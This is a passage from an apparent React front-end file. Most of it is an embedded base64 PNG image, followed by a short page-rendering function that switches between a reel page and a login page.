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"
          >

          </img>
        </div>
      </div>
    );
  }

  // --- Page Renderer ---
  const renderPage = () => {
    switch (page) {
      case 'reel':
        return <ReelPage username={username} />;
      case 'login':
        return <LoginPage username={username} db={db}/>;
      default:
        return <ReelPage username={username} />;
    }
  };

  return (
    <div className="w-screen h-screen font-sans bg-gray-50 dark:bg-black">
      {renderPage()}
    </div>
  );
}
